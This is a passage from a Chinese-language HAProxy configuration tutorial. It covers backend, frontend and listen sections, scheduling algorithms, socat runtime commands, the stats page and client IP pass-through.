    <span class="token function">timeout</span> server 120s	<span class="token comment"># 客户端请求从haproxy到后端服务端的请求处理超时时长(TCP连接之后)，默认单位ms，如果超时，会出现502错误，此值建议设置较大些，访止502错误</span>
    <span class="token function">timeout</span> client 120s	<span class="token comment"># 设置haproxy与客户端的最长非活动时间，默认单位ms，建议和timeoutserver相同</span>
    <span class="token function">timeout</span>	check 5s	<span class="token comment"># 对后端服务器的默认检测超时时间</span>
    default-server inter <span class="token number">1000</span> weight <span class="token number">3</span>	<span class="token comment"># 指定后端服务器的默认设置</span></code></pre>

<p>default-server 指定后端服务器的默认配置，以下是主要配置项：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 对指定real server进行健康状态检查，默认不开启检查,只有check后面没有其它配置也可以启用检查功能</span>
<span class="token comment"># 默认对相应的后端服务器IP和端口,利用TCP连接进行周期性健康性检查,注意必须指定端口才能实现健康性检查</span>
check
    addr <span class="token operator">&lt;</span>IP<span class="token operator">></span>		<span class="token comment"># 健康状态监测IP，可以是专门的数据网段，减少业务网络的流量</span>
    port <span class="token operator">&lt;</span>num<span class="token operator">></span>		<span class="token comment"># 健康状态监测端口</span>
    inter <span class="token operator">&lt;</span>num<span class="token operator">></span>		<span class="token comment"># 健康状态检查间隔时间，默认2000 ms</span>
    fall <span class="token operator">&lt;</span>num<span class="token operator">></span>		<span class="token comment"># 后端服务器从线上转为线下的检查的连续失效次数，默认为3</span>
    rise <span class="token operator">&lt;</span>num<span class="token operator">></span>		<span class="token comment"># 后端服务器从下线恢复上线的检查的连续有效次数，默认为2</span>
<span class="token comment"># 动态修改权重，默认为1，最大值为256，0(状态为蓝色)表示不参与负载均衡，但仍接受持久连接</span>
weight <span class="token operator">&lt;</span>weight<span class="token operator">></span>
backup			<span class="token comment"># 将后端服务器标记为备份状态,只在所有非备份主机down机时提供服务，类似Sorry Server</span>
disabled		<span class="token comment"># 将后端服务器标记为不可用状态，即维护状态，除了持久模式，将不再接受连接,状态为深黄色</span>
redirect prefix http://www.baidu.com/	<span class="token comment"># 302重定向</span>
redir http://www.baidu.com				<span class="token comment"># 同上，区别是最后不加"/"</span>
maxconn <span class="token operator">&lt;</span>maxconn<span class="token operator">></span> 						<span class="token comment"># 当前后端server的最大并发连接数</span></code></pre>

<p>注意：HAProxy server 的 weight 和 Nginx server 的 weight 表示的意义是一样的，和 Keepalived real_server 的 weight 表示的意义不一样</p>
<h4 id="frontend"><a href="#frontend" class="headerlink" title="frontend"></a>frontend</h4><pre class="language-bash" data-language="bash"><code class="language-bash">frontend magedu_web_port	<span class="token comment"># 形式命名：业务-服务-端口号</span>
    <span class="token comment"># 指定HAProxy的监听地址，可以是IPV4或IPV6，可以同时监听多个IP或端口，可同时用于listen字段中</span>
    <span class="token comment"># bind [&lt;address>]:&lt;port_range> [, ...] [param*]，address省略则等于0.0.0.0</span>
    <span class="token comment"># 注意：如果需要绑定在非本机的IP，例如vip，需要开启内核参数：net.ipv4.ip_nonlocal_bind=1</span>
    <span class="token builtin class-name">bind</span> :80,:8080
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:10080,:8801-8810,10.0.0.17:9001-9010
    mode http<span class="token operator">|</span>tcp 	<span class="token comment"># 指定负载协议类型</span>
    use_backend <span class="token operator">&lt;</span>backend_name<span class="token operator">></span> 	<span class="token comment"># 调用的后端服务器组名称</span>
    <span class="token comment"># 针对所有server配置,当前端服务器的连接数达到上限后的后援队列长度，注意：不支持backend</span>
    backlog <span class="token operator">&lt;</span>backlog<span class="token operator">></span></code></pre>

<h4 id="backend"><a href="#backend" class="headerlink" title="backend"></a>backend</h4><pre class="language-bash" data-language="bash"><code class="language-bash">backend magedu-test-http-nodes
    mode tcp	<span class="token comment"># 指定负载协议类型,和对应的frontend必须一致</span>
    default-server inter <span class="token number">1000</span> weight <span class="token number">6</span>
    <span class="token comment"># server name address:port param*	为后端真实服务器指定一个内部名称，随便写一个即可</span>
    server web1 <span class="token number">10.0</span>.0.27:80 check	<span class="token comment"># 定义后端real server,必须指定IP和端口</span>
    server web1 <span class="token number">10.0</span>.0.17:80 weight <span class="token number">2</span> check addr <span class="token number">10.0</span>.0.117 port <span class="token number">8080</span></code></pre>

<h4 id="listen"><a href="#listen" class="headerlink" title="listen"></a>listen</h4><pre class="language-bash" data-language="bash"><code class="language-bash">listen web_port
    mode http
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.71:80
    log global	<span class="token comment"># 开启日志功能,默认不记录日志</span>
    server web1 <span class="token number">127.0</span>.0.1:8080 check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span>

listen stats	<span class="token comment"># stats相关：状态页配置项</span>
    mode http
    <span class="token builtin class-name">bind</span> <span class="token number">0.0</span>.0.0:9999
    log global
    stats <span class="token builtin class-name">enable</span>	<span class="token comment"># 于默认的参数启用stats page</span>
    stats uri /haproxy-status	<span class="token comment"># 自定义stats page uri，默认值：/haproxy?stats</span>
    stats auth admin:123456		<span class="token comment"># 认证时的账号和密码，可定义多个用户,每行指定一个用户</span></code></pre>

<h4 id="使用子配置文件保存配置"><a href="#使用子配置文件保存配置" class="headerlink" title="使用子配置文件保存配置"></a>使用子配置文件保存配置</h4><p>按业务分类，将配置信息拆分，放在不同的子配置文件中，从而达到方便维护的目的</p>
<p>注意：配置文件必须为 cfg 后缀非.开头</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /etc/haproxy/conf.d/</code></pre>

<p>因为没有类似<code>include</code>的指令引入子配置，所以要在启动命令上指定子配置文件</p>
<h3 id="systemctl-启动文件"><a href="#systemctl-启动文件" class="headerlink" title="systemctl 启动文件"></a>systemctl 启动文件</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$vim</span> /usr/lib/systemd/system/haproxy.service
<span class="token punctuation">[</span>Unit<span class="token punctuation">]</span>
<span class="token assign-left variable">Description</span><span class="token operator">=</span>HAProxy Load Balancer
<span class="token assign-left variable">After</span><span class="token operator">=</span>syslog.target network.target

<span class="token punctuation">[</span>Service<span class="token punctuation">]</span>
<span class="token assign-left variable">ExecStartPre</span><span class="token operator">=</span>/usr/local/haproxy/sbin/haproxy <span class="token parameter variable">-f</span> /etc/haproxy/haproxy.cfg <span class="token parameter variable">-f</span> /etc/haproxy/conf.d/ <span class="token parameter variable">-c</span> <span class="token parameter variable">-q</span>
<span class="token assign-left variable">ExecStart</span><span class="token operator">=</span>/usr/local/haproxy/sbin/haproxy <span class="token parameter variable">-Ws</span> <span class="token parameter variable">-f</span> /etc/haproxy/haproxy.cfg <span class="token parameter variable">-f</span> /etc/haproxy/conf.d/ <span class="token parameter variable">-p</span> /var/lib/haproxy/haproxy.pid
<span class="token assign-left variable">ExecReload</span><span class="token operator">=</span>/bin/kill <span class="token parameter variable">-USR2</span> <span class="token variable">$MAINPID</span>

<span class="token punctuation">[</span>Install<span class="token punctuation">]</span>
<span class="token assign-left variable">WantedBy</span><span class="token operator">=</span>multi-user.target

<span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$useradd</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-s</span> /sbin/nologin <span class="token parameter variable">-d</span> /var/lib/haproxy haproxy</code></pre>

<h2 id="HAProxy-调度算法"><a href="#HAProxy-调度算法" class="headerlink" title="HAProxy 调度算法"></a>HAProxy 调度算法</h2><p>官方文档：<a target="_blank" rel="noopener" href="http://cbonte.github.io/haproxy-dconv/2.2/configuration.html#4-balance">http://cbonte.github.io/haproxy-dconv/2.2/configuration.html#4-balance</a></p>
<p>HAProxy 的调度算法分为静态和动态两种：</p>
<ul>
<li>静态算法：按照事先定义好的规则轮询公平调度，不关心后端服务器的当前负载、连接数和响应速度等，且无法实时修改权重(只能为 0 和 1,不支持其它值)，只能靠重启 HAProxy 生效</li>
<li>动态算法：基于后端服务器状态进行调度适当调整，优先调度至当前负载较低的服务器，且权重可以 haproxy 运行时动态调整无需重启</li>
</ul>
<h3 id="静态算法"><a href="#静态算法" class="headerlink" title="静态算法"></a>静态算法</h3><h4 id="static-rr"><a href="#static-rr" class="headerlink" title="static-rr"></a>static-rr</h4><p>基于权重的轮询调度，不支持运行时利用 socat 进行权重的动态调整（只支持 0 和 1）及后端服务器慢启动，其后端主机数量没有限制，相当于 LVS 中的 wrr</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">listen web_host
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80,:8801-8810,10.0.0.7:9001-9010
    mode http
    log global
    balance static-rr
    server web1 <span class="token number">10.0</span>.0.17:80 weight <span class="token number">1</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span>
    server web2 <span class="token number">10.0</span>.0.27:80 weight <span class="token number">2</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span></code></pre>

<h4 id="first"><a href="#first" class="headerlink" title="first"></a>first</h4><p>根据服务器在列表中的位置，自上而下进行调度，但是其只会当第一台服务器的连接数达到上限，新请求才会分配给下一台服务，因此会忽略服务器的权重设置，此方式使用较少</p>
<p>不支持用 socat 进行动态修改权重，可以设置 0 和 1</p>
<h3 id="动态算法"><a href="#动态算法" class="headerlink" title="动态算法"></a>动态算法</h3><h4 id="socat-工具"><a href="#socat-工具" class="headerlink" title="socat 工具"></a>socat 工具</h4><p>Socat 是 Linux 下的一个多功能的网络工具，名字来由是 「Socket CAT」。其功能与有瑞士军刀之称的 Netcat 类似，可以看做是 Netcat 的加强版。</p>
<p>Socat 的主要特点就是在两个数据流之间建立通道，且支持众多协议和链接方式。如 IP、TCP、 UDP、IPv6、PIPE、EXEC、System、Open、Proxy、Openssl、Socket 等。</p>
<p><strong>这里利用 socat 工具，对服务器动态权重和其它状态进行调整</strong></p>
<p>socat stdio：对文件进行标准写入和标准读取</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看HAProxy帮助</span>
<span class="token builtin class-name">echo</span> <span class="token string">"help"</span> <span class="token operator">|</span> socat stdio /var/lib/haproxy/haproxy.sock
<span class="token comment"># 查看HAProxy信息</span>
<span class="token builtin class-name">echo</span> <span class="token string">"show info"</span> <span class="token operator">|</span> socat stdio /var/lib/haproxy/haproxy.sock
<span class="token comment"># 查看所有server的各种状态</span>
<span class="token builtin class-name">echo</span> <span class="token string">"show servers state"</span> <span class="token operator">|</span> socat stdio /var/lib/haproxy/haproxy.sock
<span class="token comment"># 查看指定server的weight</span>
<span class="token builtin class-name">echo</span> <span class="token string">"get weight magedu-test-80/web2"</span> <span class="token operator">|</span> socat stdio /var/lib/haproxy/haproxy.sock
<span class="token comment"># 修改指定server的weight，如果静态算法，如:static-rr，可以更改weight为0或1，但不支持动态更改为其它值</span>
<span class="token builtin class-name">echo</span> <span class="token string">"set weight magedu-test-80/web2 2"</span> <span class="token operator">|</span> socat stdio /var/lib/haproxy/haproxy.sock
<span class="token comment"># 将指定后端服务器禁用</span>
<span class="token builtin class-name">echo</span> <span class="token string">"disable server magedu-test-80/web2"</span> <span class="token operator">|</span> socat stdio /var/lib/haproxy/haproxy.sock
<span class="token comment"># 启用指定后端服务器</span>
<span class="token builtin class-name">echo</span> <span class="token string">"enable server magedu-test-80/web2"</span> <span class="token operator">|</span> socat stdio /var/lib/haproxy/haproxy.sock
<span class="token comment"># 将后端服务器软下线，即weight设为0</span>
<span class="token builtin class-name">echo</span> <span class="token string">"set weight magedu-test-80/web1 0"</span> <span class="token operator">|</span> socat stdio /var/lib/haproxy/haproxy.sock</code></pre>

<p>一个进程就有一个 haproxy.socket 文件，以上的操作针对的都是单进程</p>
<h4 id="roundrobin"><a href="#roundrobin" class="headerlink" title="roundrobin"></a>roundrobin</h4><p>基于权重的轮询动态调度算法，支持权重的运行时调整，不同于 lvs 中的 rr 轮训模式，HAProxy 中的 roundrobin 支持慢启动(新加的服务器会逐渐增加转发数)，其每个后端 backend 中最多支持 4095 个 real server，支持对 real server 权重动态调整，roundrobin 为默认调度算法，此算法使用广泛</p>
<p>支持动态调整权重：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"get weight web_host/web1"</span> <span class="token operator">|</span> socat stdio /var/lib/haproxy/haproxy.sock
<span class="token number">1</span> <span class="token punctuation">(</span>initial <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token builtin class-name">echo</span> <span class="token string">"set weight web_host/web1 3"</span> <span class="token operator">|</span> socat stdio /var/lib/haproxy/haproxy.sock
<span class="token builtin class-name">echo</span> <span class="token string">"get weight web_host/web1"</span> <span class="token operator">|</span> socat stdio /var/lib/haproxy/haproxy.sock
<span class="token number">3</span> <span class="token punctuation">(</span>initial <span class="token number">1</span><span class="token punctuation">)</span></code></pre>

<h4 id="leastconn"><a href="#leastconn" class="headerlink" title="leastconn"></a>leastconn</h4><p>leastconn 加权的最少连接的动态，支持权重的运行时调整和慢启动，即根据当前连接最少的后端服务器而非权重进行优先调度(新客户端连接)，比较适合长连接的场景使用，比如：MySQL 等场景</p>
<h4 id="random"><a href="#random" class="headerlink" title="random"></a>random</h4><p>1.9 版本增加，负载平衡算法，其基于随机数作为一致性 hash 的 key，随机负载平衡对于大型服务器场或经常添加或删除服务器非常有用，支持 weight 的动态调整，weight 较大的主机有更大概率获取新请求</p>
<h3 id="其他算法"><a href="#其他算法" class="headerlink" title="其他算法"></a>其他算法</h3><p>其它算法即可作为静态算法，又可以通过选项成为动态算法</p>
<h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>源地址 hash，基于用户源地址 hash 并将请求转发到后端服务器，后续同一个源地址请求将被转发至同一个后端 web 服务器。此方式当后端服务器数据量发生变化时，会导致很多用户的请求转发至新的后端服务器，默认为静态方式，但是可以通过 hash-type 支持的选项更改</p>
<p>这个算法一般是在不插入 Cookie 的 TCP 模式下使用，也可给拒绝会话 cookie 的客户提供最好的会话粘性，适用于 session 会话保持但不支持 cookie 和缓存的场景</p>
<p>源地址有两种转发客户端请求到后端服务器的服务器选取计算方式：取模法、一致性 hash</p>
<h5 id="map-base-取模法"><a href="#map-base-取模法" class="headerlink" title="map-base 取模法"></a>map-base 取模法</h5><p>对 source 地址进行 hash 计算，再基于服务器总权重的取模，最终结果决定将此请求转发至对应的后端服务器。此方法是静态的，即不支持在线调整权重，不支持慢启动，可实现对后端服务器均衡调度。缺点是当服务器的总权重发生变化时，即有服务器上线或下线，都会因总权重发生变化而导致调度结果整体改变，hash-type 指定的默认值为此算法</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">listen web_host
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80,:8801-8810,10.0.0.7:9001-9010
    mode tcp
    log global
    balance <span class="token builtin class-name">source</span>
    hash-type map-based		<span class="token comment"># 取模法</span>
    server web1 <span class="token number">10.0</span>.0.17:80 weight <span class="token number">1</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">3</span>
    server web2 <span class="token number">10.0</span>.0.27:80 weight <span class="token number">1</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">3</span></code></pre>

<h5 id="一致性-hash"><a href="#一致性-hash" class="headerlink" title="一致性 hash"></a>一致性 hash</h5><p>当服务器的总权重发生变化时，对调度结果影响是局部的，不会引起大的变动，hash（o）mod n ，该 hash 算法是动态的，支持使用 socat 等工具进行在线权重调整，支持慢启动</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">listen web_host
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80,:8801-8810,10.0.0.7:9001-9010
    mode tcp
    log global
    balance <span class="token builtin class-name">source</span>
    hash-type consistent	<span class="token comment"># 一致性hash</span>
    server web1 <span class="token number">10.0</span>.0.17:80 weight <span class="token number">1</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span>
    server web2 <span class="token number">10.0</span>.0.27:80 weight <span class="token number">1</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span></code></pre>

<h4 id="uri"><a href="#uri" class="headerlink" title="uri"></a>uri</h4><p>基于对用户请求的 uri 的左半部分或整个 uri 做 hash，再将 hash 结果对总权重进行取模后，根据最终结果将请求转发到后端指定服务器，适用于后端是缓存服务器场景，默认是静态算法，也可以通过 hash-type 指定 map-based 和 consistent，来定义使用取模法还是一致性 hash</p>
<p>注意：此算法基于应用层，所以只支持 mode http ，不支持 mode tcp</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">listen web_host
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80,:8801-8810,10.0.0.7:9001-9010
    mode http
    log global
    balance uri
    <span class="token comment"># hash-type map-based			# 取模法，默认，可省略</span>
    hash-type consistent			<span class="token comment"># 一致性hash</span>
    server web1 <span class="token number">10.0</span>.0.17:80 weight <span class="token number">1</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span>
    server web2 <span class="token number">10.0</span>.0.27:80 weight <span class="token number">1</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span></code></pre>

<h4 id="url-param"><a href="#url-param" class="headerlink" title="url_param"></a>url_param</h4><p>对用户请求的 url 中的 params 部分中的一个参数 key 对应的 value 值作 hash 计算，并由服务器总权重相除以后派发至某挑出的服务器；通常用于追踪用户，以确保来自同一个用户的请求始终发往同一个 real server，如果没有 key，将按 roundrobin 算法</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 假设：http://10.0.0.7/index.html?userid=&lt;NAME_ID>&amp;typeid=&lt;TYPE_ID></span>
listen web_host
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80,:8801-8810,10.0.0.7:9001-9010
    mode http
    log global
    balance url_param userid 	<span class="token comment"># 对userid的值取hash</span>
    <span class="token comment"># hash-type map-based			# 取模法，默认，可省略</span>
    hash-type consistent			<span class="token comment"># 一致性hash</span>
    server web1 <span class="token number">10.0</span>.0.17:80 weight <span class="token number">1</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span>
    server web2 <span class="token number">10.0</span>.0.27:80 weight <span class="token number">1</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span></code></pre>

<h4 id="hdr"><a href="#hdr" class="headerlink" title="hdr"></a>hdr</h4><p>针对用户每个 http 头部(header)请求中的指定信息做 hash，此处由 name 指定的 http 首部将会被取出并做 hash 计算，然后由服务器总权重取模以后派发至某挑出的服务器，如果无有效值，则会使用默认的轮询调度</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">listen web_host
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80,:8801-8810,10.0.0.7:9001-9010
    mode http
    log global
    balance hdr<span class="token punctuation">(</span>User-Agent<span class="token punctuation">)</span>
    <span class="token comment"># hash-type map-based			# 取模法，默认，可省略</span>
    hash-type consistent			<span class="token comment"># 一致性hash</span>
    server web1 <span class="token number">10.0</span>.0.17:80 weight <span class="token number">1</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span>
    server web2 <span class="token number">10.0</span>.0.27:80 weight <span class="token number">1</span> check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span></code></pre>

<p>测试访问：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$curl</span> <span class="token parameter variable">-vA</span> <span class="token string">'firefox'</span> http://10.0.0.7/index.html
<span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$curl</span> <span class="token parameter variable">-vA</span> <span class="token string">'chrome'</span> http://10.0.0.7/index.html</code></pre>

<h4 id="rdp-cookie"><a href="#rdp-cookie" class="headerlink" title="rdp-cookie"></a>rdp-cookie</h4><h3 id="各种算法使用场景"><a href="#各种算法使用场景" class="headerlink" title="各种算法使用场景"></a>各种算法使用场景</h3><pre class="language-none"><code class="language-none">first 							# 使用较少
static-rr 						# 做了session共享的web集群
roundrobin
random
leastconn 						# 数据库
source 							# 基于客户端公网IP的会话保持
Uri---------------&gt;http 		# 缓存服务器，CDN服务商，蓝汛、百度、阿里云、腾讯
url_param---------&gt;http	 		# 可以实现session保持
hdr 							# 基于客户端请求报文头部做下一步处理
rdp-cookie 						# 基于Windows主机,很少使用</code></pre>

<h2 id="高级功能及配置"><a href="#高级功能及配置" class="headerlink" title="高级功能及配置"></a>高级功能及配置</h2><h3 id="基于-cookie-的会话保持"><a href="#基于-cookie-的会话保持" class="headerlink" title="基于 cookie 的会话保持"></a>基于 cookie 的会话保持</h3><p>为当前 server 指定 cookie 值，实现基于 cookie 的会话黏性，相对于基于 source 地址 hash 调度算法对客户端的粒度更精准，但同时也加大了 haproxy 负载，目前此模式使用较少， 已经被 session 共享服务器代替</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 配置示例：</span>
listen web_port
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80
    balance roundrobin
    mode http 			<span class="token comment"># 注意：不支持 tcp</span>
    log global
    cookie WEBSRV insert nocache indirect
    server web1 <span class="token number">10.0</span>.0.17:80 check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span> cookie web1
    server web2 <span class="token number">10.0</span>.0.27:80 check inter <span class="token number">3000</span> fall <span class="token number">2</span> rise <span class="token number">5</span> cookie web2</code></pre>

<h3 id="HAProxy-状态页"><a href="#HAProxy-状态页" class="headerlink" title="HAProxy 状态页"></a>HAProxy 状态页</h3><p>通过 web 界面，显示当前 HAProxy 的运行状态</p>
<p>状态页配置项：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">stats <span class="token builtin class-name">enable</span> 				<span class="token comment"># 基于默认的参数启用stats page</span>
stats hide-version 			<span class="token comment"># 将状态页中haproxy版本隐藏</span>
stats refresh <span class="token operator">&lt;</span>delay<span class="token operator">></span> 		<span class="token comment"># 设定自动刷新时间间隔，默认不自动刷新</span>
stats uri <span class="token operator">&lt;</span>prefix<span class="token operator">></span> 			<span class="token comment"># 自定义stats page uri，默认值：/haproxy?stats</span>
stats realm <span class="token operator">&lt;</span>realm<span class="token operator">></span> 		<span class="token comment"># 账户认证时的提示信息，示例：stats realm HAProxy\</span>
Statistics
stats auth <span class="token operator">&lt;</span>user<span class="token operator">></span>:<span class="token operator">&lt;</span>passwd<span class="token operator">></span> 	<span class="token comment"># 认证时的账号和密码，可定义多个用户,每行指定一个用户</span>
stats admin <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token operator">|</span> unless <span class="token punctuation">&#125;</span> <span class="token operator">&lt;</span>cond<span class="token operator">></span> 	<span class="token comment"># 启用stats page中的管理功能</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 启用状态页</span>
listen stats
    <span class="token builtin class-name">bind</span> :9999
    stats <span class="token builtin class-name">enable</span>
    <span class="token comment">#stats hide-version</span>
    stats uri /haproxy-status			<span class="token comment"># 自定义stats page uri</span>
    stats realm HAProxy<span class="token punctuation">\</span> Stats<span class="token punctuation">\</span> Page 	<span class="token comment"># 账户认证时的提示信息</span>
    stats auth haadmin:123456	 		<span class="token comment"># 两个用户</span>
    stats auth admin:123456
    <span class="token comment">#stats refresh 30s</span>
    stats admin <span class="token keyword">if</span> TRUE 				<span class="token comment"># 安全原因，不建议打开</span></code></pre>

<p>backend server 信息：</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1609942911229.png"></p>
<p>利用状态页实现 haproxy 服务器的健康性检查：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#curl -I http://haadmin:123456@10.0.0.7:9999/haproxy-status</span>
HTTP/1.1 <span class="token number">200</span> OK
cache-control: no-cache
content-type: text/html

<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#curl -I -u haadmin:123456 http://10.0.0.7:9999/haproxy-status</span>
HTTP/1.1 <span class="token number">200</span> OK
cache-control: no-cache
content-type: text/html

<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#echo $?</span>
<span class="token number">0</span>

<span class="token punctuation">[</span>root@haproxy ~<span class="token punctuation">]</span><span class="token comment">#systemctl stop haproxy</span>

<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#curl -I http://haadmin:123456@10.0.0.7:9999/haproxy-status</span>
curl: <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> Failed to connect to <span class="token number">10.0</span>.0.7 port <span class="token number">9999</span>: Connection refused

<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#echo $?</span>
<span class="token number">7</span></code></pre>

<h3 id="IP-透传"><a href="#IP-透传" class="headerlink" title="IP 透传"></a>IP 透传</h3><p>web 服务器中需要记录客户端的真实 IP 地址，用于做访问统计、安全防护、行为分析、区域排行等场景</p>
<h4 id="四层负载-和-七层代理"><a href="#四层负载-和-七层代理" class="headerlink" title="四层负载 和 七层代理"></a>四层负载 和 七层代理</h4><p><strong>四层负载：</strong></p>
<p>四层负载均衡设备不参与建立链接（实际上还是建立的，haproxy 和 lvs 不同，haproxy 是伪四层负载均衡）</p>
<p><strong>七层代理：</strong></p>
<p>七层负载均衡设备起到了代理服务器的作用，七层代理需要和 Client 以及后端服务器分别建立连接</p>
<h4 id="四层-IP-透传"><a href="#四层-IP-透传" class="headerlink" title="四层 IP 透传"></a>四层 IP 透传</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># haproxy 配置示例</span>
listen web_http_nodes
    <span class="token builtin class-name">bind</span> <span class="token number">172.16</span>.0.100:80
    mode tcp	 			<span class="token comment"># 不支持http协议</span>
    balance roundrobin
    server web1 to2b.cn:80 send-proxy check inter <span class="token number">3000</span> fall <span class="token number">3</span> rise <span class="token number">5</span>	<span class="token comment"># 添加send-proxy</span>

<span class="token comment"># nginx配置：在访问日志中通过变量$proxy_protocol_addr 记录透传过来的客户端IP</span>
http <span class="token punctuation">&#123;</span>
    log_format main <span class="token string">'$remote_addr - $remote_user [$time_local] "$request" "$proxy_protocol_addr"'</span>
    server <span class="token punctuation">&#123;</span>
		listen <span class="token number">80</span> proxy_protocol<span class="token punctuation">;</span> <span class="token comment">#启用此项，将无法直接访问此网站，只能通过四层代理访问</span>
		server_name to2b.cn<span class="token punctuation">;</span>
    <span class="token punctuation">..</span>.</code></pre>

<h4 id="七层-IP-透传"><a href="#七层-IP-透传" class="headerlink" title="七层 IP 透传"></a>七层 IP 透传</h4><p>当 haproxy 工作在七层的时候，也可以透传客户端真实 IP 至后端服务器</p>
<p><strong>HAProxy 配置：</strong></p>
<p>在由 haproxy 发往后端主机的请求报文中添加“X-Forwarded-For”首部</p>
<pre class="language-http" data-language="http"><code class="language-http">option forwardfor [ except &lt;network> ] [ header &lt;name> ] [ if-none ]

[ except &lt;network> ]：请求报请来自此处指定的网络时不予添加此首部，如haproxy自身所在网络
[ header &lt;name> ]：使用自定义的首部名称，而非“X-Forwarded-For"，示例：X-client
[ if-none ] 如果没有首部才添加首部，如果有使用默认值</code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">defaults
    option forwardfor	<span class="token comment"># 此为默认值,首部字段默认为：X-Forwarded-For</span>
    <span class="token comment"># option forwardfor except 127.0.0.0/8 header X-client	# 或者自定义首部,如:X-client</span></code></pre>

<p><strong>web 服务器日志格式配置：</strong></p>
<p>配置 web 服务器，记录负载均衡透传的客户端 IP 地址</p>
<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># apache</span>
LogFormat <span class="token string">"%&#123;X-Forwarded-For&#125;i %a %l %u %t <span class="token entity" title="\&quot;">\"</span>%r<span class="token entity" title="\&quot;">\"</span> %>s %b <span class="token entity" title="\&quot;">\"</span>%&#123;Referer&#125;i<span class="token entity" title="\&quot;">\"</span> <span class="token entity" title="\&quot;">\"</span>%&#123;User-Agent&#125;i<span class="token entity" title="\&quot;">\"</span>"</span> combined

<span class="token comment"># nginx</span>
<span class="token variable">$proxy_add_x_forwarded_for</span>：包括客户端IP和中间经过的所有代理的IP
<span class="token variable">$http_x_forwarded_For</span>：只有客户端IP

<span class="token comment"># tomcat</span>
<span class="token operator">&lt;</span>Valve <span class="token assign-left variable">className</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.valves.AccessLogValve"</span> <span class="token assign-left variable">directory</span><span class="token operator">=</span><span class="token string">"logs"</span> <span class="token assign-left variable">prefix</span><span class="token operator">=</span><span class="token string">"localhost_access_log"</span> <span class="token assign-left variable">suffix</span><span class="token operator">=</span><span class="token string">".txt"</span> <span class="token assign-left variable">pattern</span><span class="token operator">=</span><span class="token string">"%&#123;X-Forwarded-For&#125;i %h %l %u %t &amp;quot;%r&amp;quot; %s %b"</span> /<span class="token operator">></span></code></pre>

<h3 id="报文修改"><a href="#报文修改" class="headerlink" title="报文修改"></a>报文修改</h3><p>在 http 模式下，基于实际需求修改客户端的请求报文与响应报文</p>
<p>官方文档：<a target="_blank" rel="noopener" href="http://cbonte.github.io/haproxy-dconv/2.2/configuration.html#4-http-request">http://cbonte.github.io/haproxy-dconv/2.2/configuration.html#4-http-request</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 请求头添加字段</span>
